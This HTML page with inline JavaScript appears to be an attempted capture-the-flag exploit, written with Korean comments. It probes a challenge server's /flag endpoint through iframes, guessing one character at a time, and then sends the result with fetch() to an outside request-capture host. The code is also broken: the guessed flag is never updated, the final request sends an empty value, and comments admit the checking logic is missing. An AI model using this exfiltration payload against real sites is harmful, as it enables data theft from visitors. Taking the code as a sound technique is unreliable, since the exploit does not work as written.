<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag Finder</title>
</head>
<body>
    <h1>Flag Finderㅌ</h1>
    <script>
        const checkFlag = async () => {
            let server_flag = '';

            for (let i = 32; i <= 127; i++) {
                const flag = server_flag + String.fromCharCode(i);
                const requestUrl = `http://war.sschall.xyz:60001/flag?flag=${encodeURIComponent(flag)}`;
                
                // iframe 생성
                const iframe = document.createElement('iframe');
                iframe.src = requestUrl;
                document.body.appendChild(iframe);

                // 응답을 기다리지 않음
                await new Promise(resolve => {
                    setTimeout(() => {
                        // iframe을 제거하여 메모리 누수 방지
                        document.body.removeChild(iframe);
                        resolve();
                    }, 1000); // 1초 후에 iframe 제거
                });

                // 서버의 응답을 확인하는 로직을 여기에 추가 가능
                // 예를 들어, iframe이 응답을 수신하면 확인할 수 있는 방법이 필요함
            }

            // 최종 FLAG를 서버로 보내기
            const finalRequestUrl = `https://emadptv.request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
            fetch(finalRequestUrl); // 최종 요청
        };

        checkFlag();
    </script>
</body>
</html>
